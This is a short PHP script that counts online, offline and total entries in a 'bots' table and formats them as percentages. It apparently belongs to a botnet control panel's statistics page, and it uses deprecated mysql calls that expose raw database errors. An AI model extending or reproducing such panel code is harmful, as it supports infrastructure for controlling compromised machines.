<?php require_once('inc/session.php'); require_once('inc/config.php'); require_once('other/safe.php');

//Bots Online
$query = "SELECT COUNT(*) as Anzahl FROM bots WHERE status = 1";
$queryerg = mysql_query($query) OR die(mysql_error());
while($row = mysql_fetch_array($queryerg)){
  $bot_online = $row[0];
} 

//Bots Offline
$query = "SELECT COUNT(*) as Anzahl FROM bots WHERE status = 0";
$queryerg = mysql_query($query) OR die(mysql_error());
while($row = mysql_fetch_array($queryerg)){
  $bot_offlline = $row[0];
} 

//Bots Gesamt
$query = "SELECT COUNT(*) as Anzahl FROM bots";
$queryerg = mysql_query($query) OR die(mysql_error());
while($row = mysql_fetch_array($queryerg)){
  $bot_gesamt = $row[0];
} 

$on  = $bot_online;
$off = $bot_offlline;
$all = $bot_gesamt;


$all2 = '&nbsp;'.$all.'&nbsp;(100%)';


if($all != 0){
	$on = $on.'&nbsp;('.round($on/$all*100,0).'%)';
}

if($all != 0){
	$off = $off.'&nbsp;('.round($off/$all*100,0).'%)';
}
?>